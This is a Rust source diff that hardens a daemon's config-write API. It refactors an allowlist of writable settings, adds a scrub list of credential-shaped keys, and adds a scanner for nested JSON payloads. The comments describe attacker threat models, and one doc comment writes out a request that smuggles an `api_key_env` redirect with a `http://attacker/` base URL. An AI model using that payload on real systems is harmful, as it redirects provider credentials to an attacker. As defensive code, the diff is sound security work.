@@ -25,6 +25,7 @@ pub fn router() -> axum::Router<std::sync::Arc<AppState>> {
         .route("/metrics", axum::routing::get(prometheus_metrics))
         .route("/health", axum::routing::get(health))
         .route("/health/detail", axum::routing::get(health_detail))
+        .route("/ready", axum::routing::get(ready))
         .route("/status", axum::routing::get(status))
         .route(
             "/dashboard/snapshot",
@@ -38,6 +39,7 @@ pub fn router() -> axum::Router<std::sync::Arc<AppState>> {
         .route("/config", axum::routing::get(get_config))
         .route("/config/export", axum::routing::get(export_config))
         .route("/config/schema", axum::routing::get(config_schema))
+        .route("/config/status", axum::routing::get(config_status))
         .route("/config/set", axum::routing::post(config_set))
         .route("/config/reload", axum::routing::post(config_reload))
         .route("/security", axum::routing::get(security_status))
@@ -57,7 +59,7 @@ pub fn router() -> axum::Router<std::sync::Arc<AppState>> {
 /// deployment target. `$HOSTNAME` is honoured first for parity with
 /// containers that synthesise it; `hostname(1)` is the POSIX fallback.
 /// Returns `None` only when both fail (rare).
-fn system_hostname() -> Option<String> {
+async fn system_hostname() -> Option<String> {
     if let Ok(h) = std::env::var("HOSTNAME") {
         let trimmed = h.trim();
         if !trimmed.is_empty() {
@@ -66,8 +68,9 @@ fn system_hostname() -> Option<String> {
     }
     #[cfg(unix)]
     {
-        std::process::Command::new("hostname")
+        tokio::process::Command::new("hostname")
             .output()
+            .await
             .ok()
             .and_then(|o| String::from_utf8(o.stdout).ok())
             .map(|s| s.trim().to_string())
@@ -93,12 +96,13 @@ fn system_hostname() -> Option<String> {
 /// neither `ps` nor `tasklist` is available, or when parsing the output
 /// fails — callers should render a placeholder in that case rather than
 /// treating `0` as a real reading.
-fn current_process_rss_mb() -> Option<u64> {
+async fn current_process_rss_mb() -> Option<u64> {
     #[cfg(unix)]
     {
-        std::process::Command::new("ps")
+        tokio::process::Command::new("ps")
             .args(["-o", "rss=", "-p", &std::process::id().to_string()])
             .output()
+            .await
             .ok()
             .and_then(|o| String::from_utf8(o.stdout).ok())
             .and_then(|s| s.trim().parse::<u64>().ok())
@@ -106,9 +110,8 @@ fn current_process_rss_mb() -> Option<u64> {
     }
     #[cfg(windows)]
     {
-        use std::os::windows::process::CommandExt;
         const CREATE_NO_WINDOW: u32 = 0x0800_0000;
-        std::process::Command::new("tasklist")
+        tokio::process::Command::new("tasklist")
             .args([
                 "/FI",
                 &format!("PID eq {}", std::process::id()),
@@ -118,6 +121,7 @@ fn current_process_rss_mb() -> Option<u64> {
             ])
             .creation_flags(CREATE_NO_WINDOW)
             .output()
+            .await
             .ok()
             .and_then(|o| String::from_utf8(o.stdout).ok())
             .and_then(|s| {
@@ -278,13 +282,17 @@ fn llm_health_snapshot(state: &AppState) -> LlmHealthSnapshot {
 
 /// Strip embedded `user:pass@` credentials from a URL, keeping host/port.
 ///
-/// Used for telemetry / OTLP endpoints that may legitimately contain a
-/// basic-auth tuple in the URL. Returns the input unchanged when no `@`
-/// follows the scheme — i.e. when there is nothing to redact.
+/// Used for configured endpoints, including pairing and OTLP, that may
+/// legitimately contain a basic-auth tuple in the URL. Returns the input
+/// unchanged when the authority has no `@` delimiter.
 fn redact_url_credentials(url: &str) -> String {
     if let Some(scheme_end) = url.find("://") {
         let after_scheme = &url[scheme_end + 3..];
-        if let Some(at_pos) = after_scheme.find('@') {
+        let authority_end = after_scheme
+            .find(['/', '?', '#'])
+            .unwrap_or(after_scheme.len());
+        let authority = &after_scheme[..authority_end];
+        if let Some(at_pos) = authority.rfind('@') {
             let host_and_rest = &after_scheme[at_pos..]; // includes '@'
             return format!("{}://***{}", &url[..scheme_end], host_and_rest);
         }
@@ -348,6 +356,10 @@ pub fn ui_sections_overlay() -> serde_json::Value {
                 "max_cron_jobs", "agent_max_iterations", "workspaces_dir",
                 // Newly surfaced root-level scalars (#4678).
                 "update_channel", "max_history_messages", "max_upload_size_bytes",
+                // Fleet-wide fallback owner for artifacts created without an
+                // authenticated caller (#7744). Root-level scalar, so it renders here
+                // rather than as its own section.
+                "default_owner",
                 "max_concurrent_bg_llm", "max_agent_call_depth", "max_request_body_bytes",
                 "workflow_stale_timeout_minutes", "workflow_default_total_timeout_secs",
                 "tool_timeout_secs",
@@ -392,6 +404,7 @@ pub fn ui_sections_overlay() -> serde_json::Value {
         {"key": "links", "struct_field": "links"},
         {"key": "reload", "struct_field": "reload"},
         {"key": "budget", "struct_field": "budget"},
+        {"key": "usage", "struct_field": "usage"},
         {"key": "thinking", "struct_field": "thinking"},
         {"key": "pairing", "struct_field": "pairing"},
         {"key": "broadcast", "struct_field": "broadcast"},
@@ -525,6 +538,9 @@ pub fn ui_options_overlay(
         "/browser/timeout_secs": {"min": 5, "max": 300, "step": 1},
         "/browser/idle_timeout_secs": {"min": 0, "max": 3600, "step": 1},
         "/browser/max_sessions": {"min": 1, "max": 20, "step": 1},
+        // Floor is the truncation marker's own length rounded up — below it every page reduces to the marker and no content survives.
+        // Ceiling is ~250k tokens at ~4 chars/token, past the largest context window any provider currently offers.
+        "/browser/max_content_chars": {"min": 1_000, "max": 1_000_000, "step": 1_000},
 
         // ── network ──
         "/network/max_peers": {"min": 1, "max": 1000, "step": 1},
@@ -579,6 +595,236 @@ pub fn ui_options_overlay(
     })
 }
 
+/// Exact-match half of the `POST /api/config/set` allowlist — single user-tunable scalars.
+///
+/// Module-level rather than a function-local `const` so the build-time guard can check every entry against the real `KernelConfig` schema instead of restating the list (#6605).
+/// See `manage::writable_allowlist_backing_field_tests::every_writable_allowlist_entry_has_a_backing_config_field`.
+const WRITABLE_EXACT_PATHS: &[&str] = &[
+    // `ui.theme`, `ui.locale`, `ui.timezone`, and `ui.language` headed this list from #4113 under the comment "UI / locale (no security impact)", and were removed in #6605.
+    // `KernelConfig` has no `ui` field and never had one, so every write against those paths was accepted, dropped a `[ui]` table into `config.toml`, and was then discarded by the next load (`KernelConfig` does not set `deny_unknown_fields`) — the value was never applied and never appeared in `GET /api/config`.
+    // Nothing posted them either: the dashboard keeps theme, language, and sidebar state in browser `localStorage` via zustand `persist` (key `librefang-ui-storage`), which is why the dead paths went unnoticed for so long.
+    // An allowlist entry with no backing field is worse than a missing one — it reports success for a write that silently evaporates.
+    "log_level",
+    // History trim cap (gotcha bound by MIN_HISTORY_MESSAGES on reload).
+    "max_history_messages",
+    // Approval policy display knobs (NOT the second_factor enforcement
+    // mode, NOT totp_* — those would let an Owner-role attacker silently
+    // turn off 2FA after an API-key leak).
+    "approval.auto_approve_autonomous",
+    "approval.auto_approve",
+    "approval.totp_grace_period_secs",
+    // ── Newly user-tunable root-level scalars (#4678) ──
+    // Update channel + size / depth caps; default model / mode flags;
+    // localisation. Deliberately excludes `api_key`, `dashboard_pass*`,
+    // `dashboard_user`, `cors_origin`, `trust_forwarded_for`,
+    // `network_enabled`, `api_listen`, `trusted_*`, `home_dir`, `data_dir`,
+    // `log_dir`, `cron_session_*`, and `require_auth_for_reads` — those
+    // are infrastructure / auth knobs that need a deliberate file edit.
+    "update_channel",
+    "max_upload_size_bytes",
+    "max_concurrent_bg_llm",
+    "max_agent_call_depth",
+    "max_request_body_bytes",
+    "workflow_stale_timeout_minutes",
+    "tool_timeout_secs",
+    // The local backend's per-command default, sibling of `tool_timeout_secs`
+    // (#8171). Listed leaf-by-leaf rather than as a `tool_exec.` prefix because
+    // the same section carries the SSH / Daytona credential knobs.
+    "tool_exec.default_timeout_secs",
+    "local_probe_interval_secs",
+    "prompt_caching",
+    "stable_prefix_mode",
+    "usage_footer",
+    "language",
+    "mode",
+    "agent_max_iterations",
+    "max_cron_jobs",
+    // ── Collection-typed sections, primitive-valued only (#4678) ──
+    // The dashboard's StringMapEditor / NumberMapEditor saves the
+    // entire collection as one JSON value posted at the section's
+    // bare path. Restricted to BTreeMap<String, String|u64> sections
+    // because their value type is primitive — there is no nested
+    // payload that could carry a credential past the path-string
+    // SCRUB check. Vec<Struct> sections (sidecar_channels,
+    // fallback_providers, taint_rules) are intentionally NOT here:
+    // their items have nested fields (e.g. SidecarChannel.env) that
+    // SCRUB_SUFFIXES — which only inspects the dotted path string —
+    // cannot police inside a wholesale JSON payload.
+    // `sidecar_channels` writes go through the dedicated
+    // `POST /api/channels/sidecar/{name}/configure` endpoint, which
+    // validates against the cached `--describe` schema and splits
+    // secrets vs non-secrets across `secrets.env` and `config.toml`.
+    // `fallback_providers` / `taint_rules` remain edit-on-disk for
+    // now (round-4 review of #4678).
+    "provider_urls",
+    "provider_regions",
+    "provider_proxy_urls",
+    "provider_request_timeout_secs",
+    "provider_max_retries",
+    "tool_timeouts",
+    // ── Round-5 review of #4678 — safe network knobs ──
+    // The whole `network.` prefix was withdrawn (see SECTION_PREFIXES
+    // comment below) because `network.bootstrap_peers` was reachable
+    // as a depth-1 leaf and post-auth flips would redirect DHT
+    // discovery to attacker-controlled peers. The display knobs
+    // listed here have no peer-redirection or auth surface.
+    // Excludes `listen_addresses` (binding 0.0.0.0 post-auth would
+    // expose a previously loopback-only API surface — edit on disk),
+    // and excludes `bootstrap_peers` / `shared_secret`.
+    "network.mdns_enabled",
+    "network.max_peers",
+    "network.max_messages_per_peer_per_minute",
+];
+
+// Section prefixes — any leaf under these prefixes is allowed. The
+// section itself is NOT writable as a whole (would clobber the table),
+// because validate_config_key_path requires the path to have a leaf.
+const WRITABLE_SECTION_PREFIXES: &[&str] = &[
+    // Per-channel enable/feature toggles. Excludes `*.token` /
+    // `*.shared_secret` because those keys are scrubbed below.
+    "channels.",
+    // Web search / fetch knobs (URLs and timeouts).
+    "web.",
+    // Rate-limit display knobs.
+    "rate_limit.",
+    // Queue / concurrency tuning.
+    "queue.",
+    // ── Newly user-tunable section prefixes (#4678) ──
+    // Tool invocation / parallelism / result spill / policy.
+    "tool_invoke.",
+    "parallel_tools.",
+    "tool_results.",
+    "tool_policy.",
+    // Per-tool timeout overrides — values are integers (seconds), no secrets.
+    "tool_timeouts.",
+    // Compaction & trigger system tuning.
+    "compaction.",
+    "triggers.",
+    // Registry / inbox / health / heartbeat / notification.
+    "registry.",
+    "inbox.",
+    "health_check.",
+    "heartbeat.",
+    "notification.",
+    // Task board, prompt intelligence, context engine.
+    "task_board.",
+    "prompt_intelligence.",
+    "context_engine.",
+    // Auto-dream scheduler.
+    "auto_dream.",
+    // Media / link / TTS / canvas behaviour.
+    "media.",
+    "links.",
+    "tts.",
+    "canvas.",
+    // Extensions reconnect tuning, session retention.
+    "extensions.",
+    "session.",
+    // Memory tuning.
+    "proactive_memory.",
+    "memory.",
+    // Browser / Docker sandbox / vault tuning. SCRUB_SUFFIXES still
+    // blocks `*.api_key`, `*.password`, `*.bypass`, `*.admin`, `*.owner`.
+    "browser.",
+    "docker.",
+    "vault.",
+    // Pairing & A2A — token_env / shared_secret keys are blocked by SCRUB.
+    "pairing.",
+    "a2a.",
+    // Sanitize / privacy display switches.
+    "sanitize.",
+    "privacy.",
+    // Note: `audit.` and `telemetry.` are intentionally NOT here
+    // (round-4 review of #4678). They expose `audit.anchor_path`
+    // (Merkle tamper-detect target) and `telemetry.otlp_endpoint`
+    // (trace export destination) — neither is acceptable to mutate
+    // post-auth. Display knobs (sample_rate, retention_days) are
+    // available via /api/config but not via /api/config/set; users
+    // edit those on disk where the change leaves a file mtime trail.
+    // Webhook trigger toggles (token / token_env still SCRUB-blocked).
+    "webhook_triggers.",
+    // Auto-reply / broadcast routing.
+    "auto_reply.",
+    "broadcast.",
+    // Provider URL/region/timeout/proxy maps (URLs are public endpoints;
+    // SCRUB-suffix list still blocks any `*.api_key` keys that snuck in).
+    "provider_urls.",
+    "provider_regions.",
+    "provider_proxy_urls.",
+    "provider_request_timeout_secs.",
+    "provider_max_retries.",
+    // Vertex AI region + Azure OpenAI configuration knobs (the
+    // SCRUB suffix list still blocks api_key/_env/client_secret
+    // entries embedded in either section).
+    "vertex_ai.",
+    "azure_openai.",
+    // Note: `proxy.` is intentionally NOT here (round-4 review of
+    // #4678). Owner-role posting `proxy.http_proxy` could MITM all
+    // outbound LLM traffic in flight. The proxy URL is a system
+    // boundary that should be edited on disk (file mtime trail).
+    // Default model selection (provider/model/base_url; api_key SCRUB-blocked).
+    "default_model.",
+    // Extended thinking parameters.
+    "thinking.",
+    // Budget caps (USD ceilings, alert threshold, per-hour token cap).
+    "budget.",
+    // Reload mode/debounce.
+    "reload.",
+    // Note: `external_oauth.`, `external_auth.`, `oauth.` are
+    // intentionally NOT here (round-4 review of #4678). They expose
+    // `*.issuer_url`, `*.allowed_domains`, `*.redirect_url`,
+    // `*.require_email_verified`, `*.client_id` — flipping any of
+    // those post-auth lets an Owner-role attacker redirect login,
+    // broaden the email allowlist, or skip email verification
+    // (regression vector for #3703). SCRUB only blocks
+    // `_secret_env` and the new `_env` suffix; non-secret-but-
+    // load-bearing identity fields aren't in SCRUB. Edit on disk.
+    // Terminal access controls.
+    "terminal.",
+    // Note: `network.` is intentionally NOT here (round-5 review of
+    // #4678). `network.bootstrap_peers` was reachable as a depth-1
+    // leaf and is a `Vec<String>`; an Owner-role attacker who flipped
+    // it post-auth could redirect DHT discovery to attacker peers
+    // (parallel threat model to the round-4 removal of `proxy.`
+    // for outbound LLM MITM). Safe display knobs (`mdns_enabled`,
+    // `max_peers`, `max_messages_per_peer_per_minute`) are EXACT-listed
+    // above; everything else stays edit-on-disk.
+    // Approval policy fields are intentionally NOT a section prefix:
+    // the existing EXACT list above covers the safe display knobs
+    // (`auto_approve_autonomous`, `auto_approve`, `totp_grace_period_secs`),
+    // and the test suite asserts that `approval.second_factor` stays
+    // closed — flipping it via the dashboard would let an Owner-role
+    // attacker silently disable 2FA after an API-key leak.
+    // Shell exec policy (timeouts, mode, allowed_env_vars list).
+    "exec_policy.",
+    // LLM auxiliary chains.
+    "llm.",
+    // Plugins / skills tuning.
+    "plugins.",
+    "skills.",
+];
+
+// Section prefixes where the depth-1 leaf (vendor / collection-element)
+// is itself a struct containing credential-shaped fields that
+// SCRUB_SUFFIXES cannot police inside a wholesale JSON payload.
+// Writes against these prefixes must be depth-2 (per-leaf) only —
+// same defect class round-4 explicitly removed `sidecar_channels` /
+// `fallback_providers` / `taint_rules` for. Round-5 review of #4678.
+//
+// `channels.<vendor>` is `OneOrMany<*Config>` containing
+// `*_token_env` / `*_secret_env` / etc.; depth-1 wholesale-replacement
+// would let an Owner-role caller redirect the env-var that resolves
+// a bot/API token. Depth-2 (`channels.telegram.enabled` etc.) goes
+// through SCRUB_SUFFIXES which catches the `_env` blanket.
+//
+// State of this rule after the sidecar migration, recorded while auditing dangling allowlist entries for #6605.
+// `ChannelsConfig` no longer declares any per-vendor field — only the three file-transfer scalars (`file_download_dir`, `file_download_max_bytes`, `file_upload_max_bytes`), which sit at depth 1 and are therefore rejected by the rule above, while no depth-2 path under `channels.` resolves to a field at all.
+// A depth-2 write such as `channels.telegram.enabled` is still accepted, still lands a `[channels.telegram]` table in config.toml, and is still discarded by the next load — the same silent-no-op shape #6605 removed the `ui.*` entries for.
+// `every_writable_allowlist_entry_has_a_backing_config_field` cannot see it: the guard checks a section prefix at its base, and `channels` is a real `KernelConfig` field, so the dangling part sits one level below what the guard inspects.
+// The visible half is the mirror image: `ui_sections_overlay` declares a `channels` section and `ConfigPage` posts `<section>.<field>`, so the dashboard renders editors for the three real scalars and every save of one is rejected with 403.
+// Both candidate repairs (drop `channels.` so the surface matches the struct, or move it to depth 1 so the three real scalars become writable) change the write surface rather than the allowlist's internal consistency, so they are a maintainer call, not a mechanical consequence of #6605.
+const WRITABLE_DEPTH_2_ONLY_PREFIXES: &[&str] = &["channels."];
+
 /// Allowlist of user-tunable config paths writable via POST /api/config/set
 /// (#3458). Anything not in this list MUST be edited on disk.
 ///
@@ -586,236 +832,11 @@ pub fn ui_options_overlay(
 /// Trailing `.*` wildcards permit any single key under a section (used for
 /// per-channel toggles like `channels.telegram.enabled`).
 pub(crate) fn is_writable_config_path(path: &str) -> bool {
-    // Exact-match list — single user-tunable scalars.
-    const EXACT: &[&str] = &[
-        // UI / locale (no security impact).
-        "ui.theme",
-        "ui.locale",
-        "ui.timezone",
-        "ui.language",
-        "log_level",
-        // History trim cap (gotcha bound by MIN_HISTORY_MESSAGES on reload).
-        "max_history_messages",
-        // Approval policy display knobs (NOT the second_factor enforcement
-        // mode, NOT totp_* — those would let an Owner-role attacker silently
-        // turn off 2FA after an API-key leak).
-        "approval.auto_approve_autonomous",
-        "approval.auto_approve",
-        "approval.totp_grace_period_secs",
-        // ── Newly user-tunable root-level scalars (#4678) ──
-        // Update channel + size / depth caps; default model / mode flags;
-        // localisation. Deliberately excludes `api_key`, `dashboard_pass*`,
-        // `dashboard_user`, `cors_origin`, `trust_forwarded_for`,
-        // `network_enabled`, `api_listen`, `trusted_*`, `home_dir`, `data_dir`,
-        // `log_dir`, `cron_session_*`, and `require_auth_for_reads` — those
-        // are infrastructure / auth knobs that need a deliberate file edit.
-        "update_channel",
-        "max_upload_size_bytes",
-        "max_concurrent_bg_llm",
-        "max_agent_call_depth",
-        "max_request_body_bytes",
-        "workflow_stale_timeout_minutes",
-        "tool_timeout_secs",
-        "local_probe_interval_secs",
-        "prompt_caching",
-        "stable_prefix_mode",
-        "usage_footer",
-        "language",
-        "mode",
-        "agent_max_iterations",
-        "max_cron_jobs",
-        // ── Whole-section overrides written by dedicated typed handlers ──
-        // `budget`, `memory`, `proactive_memory`, and `sidecar_channels` are
-        // persisted to the DB config store by their own typed handlers
-        // (routes/budget.rs, routes/memory.rs, routes/channels.rs — phase 9
-        // settings-to-store). They are applied at resolve time via
-        // `config_store_overlay::TRUSTED_SECTION_KEYS`, NOT through this list,
-        // so the untrusted generic `config_set` endpoint cannot write them
-        // (its `_env` / depth-2 / SCRUB protections must keep policing those
-        // sections). The typed `deserialize → validate_config_for_reload` pass
-        // at resolve time is the guard for the trusted path. Do NOT add them
-        // here.
-        // ── Collection-typed sections, primitive-valued only (#4678) ──
-        // The dashboard's StringMapEditor / NumberMapEditor saves the
-        // entire collection as one JSON value posted at the section's
-        // bare path. Restricted to BTreeMap<String, String|u64> sections
-        // because their value type is primitive — there is no nested
-        // payload that could carry a credential past the path-string
-        // SCRUB check. Vec<Struct> sections (sidecar_channels,
-        // fallback_providers, taint_rules) are intentionally NOT here:
-        // their items have nested fields (e.g. SidecarChannel.env) that
-        // SCRUB_SUFFIXES — which only inspects the dotted path string —
-        // cannot police inside a wholesale JSON payload.
-        // `sidecar_channels` writes go through the dedicated
-        // `POST /api/channels/sidecar/{name}/configure` endpoint, which
-        // validates against the cached `--describe` schema and splits
-        // secrets vs non-secrets across `secrets.env` and `config.toml`.
-        // `fallback_providers` / `taint_rules` remain edit-on-disk for
-        // now (round-4 review of #4678).
-        "provider_urls",
-        "provider_regions",
-        "provider_proxy_urls",
-        "provider_request_timeout_secs",
-        "provider_max_retries",
-        "tool_timeouts",
-        // ── Round-5 review of #4678 — safe network knobs ──
-        // The whole `network.` prefix was withdrawn (see SECTION_PREFIXES
-        // comment below) because `network.bootstrap_peers` was reachable
-        // as a depth-1 leaf and post-auth flips would redirect DHT
-        // discovery to attacker-controlled peers. The display knobs
-        // listed here have no peer-redirection or auth surface.
-        // Excludes `listen_addresses` (binding 0.0.0.0 post-auth would
-        // expose a previously loopback-only API surface — edit on disk),
-        // and excludes `bootstrap_peers` / `shared_secret`.
-        "network.mdns_enabled",
-        "network.max_peers",
-        "network.max_messages_per_peer_per_minute",
-    ];
-    if EXACT.contains(&path) {
+    if WRITABLE_EXACT_PATHS.contains(&path) {
         return true;
     }
 
-    // Section prefixes — any leaf under these prefixes is allowed. The
-    // section itself is NOT writable as a whole (would clobber the table),
-    // because validate_config_key_path requires the path to have a leaf.
-    const SECTION_PREFIXES: &[&str] = &[
-        // Per-channel enable/feature toggles. Excludes `*.token` /
-        // `*.shared_secret` because those keys are scrubbed below.
-        "channels.",
-        // Web search / fetch knobs (URLs and timeouts).
-        "web.",
-        // Rate-limit display knobs.
-        "rate_limit.",
-        // Queue / concurrency tuning.
-        "queue.",
-        // ── Newly user-tunable section prefixes (#4678) ──
-        // Tool invocation / parallelism / result spill / policy.
-        "tool_invoke.",
-        "parallel_tools.",
-        "tool_results.",
-        "tool_policy.",
-        // Per-tool timeout overrides — values are integers (seconds), no secrets.
-        "tool_timeouts.",
-        // Compaction & trigger system tuning.
-        "compaction.",
-        "triggers.",
-        // Registry / inbox / health / heartbeat / notification.
-        "registry.",
-        "inbox.",
-        "health_check.",
-        "heartbeat.",
-        "notification.",
-        // Task board, prompt intelligence, context engine.
-        "task_board.",
-        "prompt_intelligence.",
-        "context_engine.",
-        // Auto-dream scheduler.
-        "auto_dream.",
-        // Media / link / TTS / canvas behaviour.
-        "media.",
-        "links.",
-        "tts.",
-        "canvas.",
-        // Extensions reconnect tuning, session retention.
-        "extensions.",
-        "session.",
-        // Memory tuning.
-        "proactive_memory.",
-        "memory.",
-        // Browser / Docker sandbox / vault tuning. SCRUB_SUFFIXES still
-        // blocks `*.api_key`, `*.password`, `*.bypass`, `*.admin`, `*.owner`.
-        "browser.",
-        "docker.",
-        "vault.",
-        // Pairing & A2A — token_env / shared_secret keys are blocked by SCRUB.
-        "pairing.",
-        "a2a.",
-        // Sanitize / privacy display switches.
-        "sanitize.",
-        "privacy.",
-        // Note: `audit.` and `telemetry.` are intentionally NOT here
-        // (round-4 review of #4678). They expose `audit.anchor_path`
-        // (Merkle tamper-detect target) and `telemetry.otlp_endpoint`
-        // (trace export destination) — neither is acceptable to mutate
-        // post-auth. Display knobs (sample_rate, retention_days) are
-        // available via /api/config but not via /api/config/set; users
-        // edit those on disk where the change leaves a file mtime trail.
-        // Webhook trigger toggles (token / token_env still SCRUB-blocked).
-        "webhook_triggers.",
-        // Auto-reply / broadcast routing.
-        "auto_reply.",
-        "broadcast.",
-        // Provider URL/region/timeout/proxy maps (URLs are public endpoints;
-        // SCRUB-suffix list still blocks any `*.api_key` keys that snuck in).
-        "provider_urls.",
-        "provider_regions.",
-        "provider_proxy_urls.",
-        "provider_request_timeout_secs.",
-        "provider_max_retries.",
-        // Vertex AI region + Azure OpenAI configuration knobs (the
-        // SCRUB suffix list still blocks api_key/_env/client_secret
-        // entries embedded in either section).
-        "vertex_ai.",
-        "azure_openai.",
-        // Note: `proxy.` is intentionally NOT here (round-4 review of
-        // #4678). Owner-role posting `proxy.http_proxy` could MITM all
-        // outbound LLM traffic in flight. The proxy URL is a system
-        // boundary that should be edited on disk (file mtime trail).
-        // Default model selection (provider/model/base_url; api_key SCRUB-blocked).
-        "default_model.",
-        // Extended thinking parameters.
-        "thinking.",
-        // Budget caps (USD ceilings, alert threshold, per-hour token cap).
-        "budget.",
-        // Reload mode/debounce.
-        "reload.",
-        // Note: `external_oauth.`, `external_auth.`, `oauth.` are
-        // intentionally NOT here (round-4 review of #4678). They expose
-        // `*.issuer_url`, `*.allowed_domains`, `*.redirect_url`,
-        // `*.require_email_verified`, `*.client_id` — flipping any of
-        // those post-auth lets an Owner-role attacker redirect login,
-        // broaden the email allowlist, or skip email verification
-        // (regression vector for #3703). SCRUB only blocks
-        // `_secret_env` and the new `_env` suffix; non-secret-but-
-        // load-bearing identity fields aren't in SCRUB. Edit on disk.
-        // Terminal access controls.
-        "terminal.",
-        // Note: `network.` is intentionally NOT here (round-5 review of
-        // #4678). `network.bootstrap_peers` was reachable as a depth-1
-        // leaf and is a `Vec<String>`; an Owner-role attacker who flipped
-        // it post-auth could redirect DHT discovery to attacker peers
-        // (parallel threat model to the round-4 removal of `proxy.`
-        // for outbound LLM MITM). Safe display knobs (`mdns_enabled`,
-        // `max_peers`, `max_messages_per_peer_per_minute`) are EXACT-listed
-        // above; everything else stays edit-on-disk.
-        // Approval policy fields are intentionally NOT a section prefix:
-        // the existing EXACT list above covers the safe display knobs
-        // (`auto_approve_autonomous`, `auto_approve`, `totp_grace_period_secs`),
-        // and the test suite asserts that `approval.second_factor` stays
-        // closed — flipping it via the dashboard would let an Owner-role
-        // attacker silently disable 2FA after an API-key leak.
-        // Shell exec policy (timeouts, mode, allowed_env_vars list).
-        "exec_policy.",
-        // LLM auxiliary chains.
-        "llm.",
-        // Plugins / skills tuning.
-        "plugins.",
-        "skills.",
-    ];
-    // Section prefixes where the depth-1 leaf (vendor / collection-element)
-    // is itself a struct containing credential-shaped fields that
-    // SCRUB_SUFFIXES cannot police inside a wholesale JSON payload.
-    // Writes against these prefixes must be depth-2 (per-leaf) only —
-    // same defect class round-4 explicitly removed `sidecar_channels` /
-    // `fallback_providers` / `taint_rules` for. Round-5 review of #4678.
-    //
-    // `channels.<vendor>` is `OneOrMany<*Config>` containing
-    // `*_token_env` / `*_secret_env` / etc.; depth-1 wholesale-replacement
-    // would let an Owner-role caller redirect the env-var that resolves
-    // a bot/API token. Depth-2 (`channels.telegram.enabled` etc.) goes
-    // through SCRUB_SUFFIXES which catches the `_env` blanket.
-    const DEPTH_2_ONLY_PREFIXES: &[&str] = &["channels."];
-    let in_section = SECTION_PREFIXES.iter().any(|pfx| {
+    let in_section = WRITABLE_SECTION_PREFIXES.iter().any(|pfx| {
         if !path.starts_with(pfx) {
             return false;
         }
@@ -824,7 +845,7 @@ pub(crate) fn is_writable_config_path(path: &str) -> bool {
             return false;
         }
         let segments = rest.split('.').count();
-        if DEPTH_2_ONLY_PREFIXES.contains(pfx) {
+        if WRITABLE_DEPTH_2_ONLY_PREFIXES.contains(pfx) {
             segments == 2
         } else {
             // Single leaf (e.g. "web.search_provider") or one nested level
@@ -838,38 +859,104 @@ pub(crate) fn is_writable_config_path(path: &str) -> bool {
 
     // Within an allowed section, refuse keys that obviously carry secrets or
     // override security-critical knobs even if the operator points us at one
-    // of the curated sections by name.
-    const SCRUB_SUFFIXES: &[&str] = &[
-        ".api_key",
-        ".token",
-        ".secret",
-        ".shared_secret",
-        ".password",
-        ".bypass",
-        ".admin",
-        ".owner",
-        // Round-4 review of #4678: env-var-name redirects. Codebase
-        // pervasively uses `*_token_env`, `*_password_env`,
-        // `*_secret_env`, `*_client_secret_env`, `*_api_key_env`,
-        // `bot_token_env`, `access_token_env`, `cdp_auth_token_env`.
-        // The original SCRUB only blocked literal `.api_key` etc., so
-        // an attacker could repoint `<section>.api_key_env` at any env
-        // var the daemon has access to and force a credential rotation
-        // through a logged channel. The blanket `_env` suffix catches
-        // every variant the workspace currently uses (verified by grep
-        // against librefang-types/src/config/types.rs).
-        "_env",
+    // of the curated sections by name. The check is on the path's final
+    // segment, which is what the caller is actually assigning.
+    if path.rsplit('.').next().is_some_and(is_scrubbed_config_key) {
+        return false;
+    }
+    true
+}
+
+/// True when `key` is the name of a config field that `POST /api/config/set`
+/// must never assign, because it carries a credential, redirects the env var a
+/// credential is resolved from, or grants privilege.
+///
+/// This is the single source of truth for both halves of the scrub: the path
+/// check in [`is_writable_config_path`] applies it to a path's final segment,
+/// and [`scrubbed_key_in_payload`] applies it to every key inside a submitted
+/// JSON payload. Keeping one predicate is the point — a new entry here closes
+/// the leaf path and the wholesale-table payload at the same time, instead of
+/// closing one and leaving the other open (#8085).
+pub(crate) fn is_scrubbed_config_key(key: &str) -> bool {
+    // Exact field names. Matched exactly rather than by suffix so that
+    // `shared_secret` is caught by its own entry and a field like `bot_token`
+    // is not caught by `token` — which is the behaviour the path check has had
+    // since round-4 of #4678, preserved here deliberately.
+    const SCRUB_KEYS: &[&str] = &[
+        "api_key",
+        "token",
+        "secret",
+        "shared_secret",
+        "password",
+        "bypass",
+        "admin",
+        "owner",
         // OAuth public identity that's safe to *display* but not safe
         // to mutate (issuer redirect / consent skipping). External
         // auth sections are mostly off the prefix list now, but defense
         // in depth in case anything slips through a writable section.
-        ".client_id",
-        ".client_secret",
+        "client_id",
+        "client_secret",
     ];
-    if SCRUB_SUFFIXES.iter().any(|s| path.ends_with(s)) {
-        return false;
+    // Round-4 review of #4678: env-var-name redirects. Codebase
+    // pervasively uses `*_token_env`, `*_password_env`,
+    // `*_secret_env`, `*_client_secret_env`, `*_api_key_env`,
+    // `bot_token_env`, `access_token_env`, `cdp_auth_token_env`.
+    // The original SCRUB only blocked literal `api_key` etc., so
+    // an attacker could repoint `<section>.api_key_env` at any env
+    // var the daemon has access to and force a credential rotation
+    // through a logged channel. The blanket `_env` suffix catches
+    // every variant the workspace currently uses (verified by grep
+    // against librefang-types/src/config/types.rs).
+    const SCRUB_KEY_SUFFIXES: &[&str] = &["_env"];
+
+    SCRUB_KEYS.contains(&key) || SCRUB_KEY_SUFFIXES.iter().any(|s| key.ends_with(s))
+}
+
+/// Return the first credential-shaped key found anywhere inside `value`, at any
+/// depth, or `None` when the payload carries none.
+///
+/// The path check alone is not enough. A writable section prefix accepts a
+/// write one level below the section (`segments == 1 || segments == 2` in
+/// [`is_writable_config_path`]), and at that depth the handler assigns the
+/// submitted JSON *wholesale* — `doc[section][key] = <value>`. So a caller can
+/// post an entire table at a path whose own name is innocuous and smuggle a
+/// scrubbed field in as one of its members:
+///
+/// ```text
+/// POST /api/config/set
+/// {"path": "media.custom_stt",
+///  "value": {"api_key_env": "ANTHROPIC_API_KEY", "base_url": "http://attacker/"}}
+/// ```
+///
+/// `media.custom_stt` ends in neither a scrubbed name nor `_env`, so the path
+/// check passes and the `api_key_env` redirect lands. That is the same defect
+/// class round-4 of #4678 removed `sidecar_channels` / `fallback_providers` /
+/// `taint_rules` from the allowlist for, and that
+/// `WRITABLE_DEPTH_2_ONLY_PREFIXES` forces per-leaf writes for under
+/// `channels.` — both of which are enumerations of known-bad prefixes rather
+/// than a rule, so every newly struct-typed config field reopened the hole.
+/// Scanning the payload closes it once for every section (#8085).
+///
+/// Legitimate per-field edits are unaffected: the same field is still writable
+/// one level deeper (`media.custom_stt.base_url`), where the path check governs
+/// it as it always has.
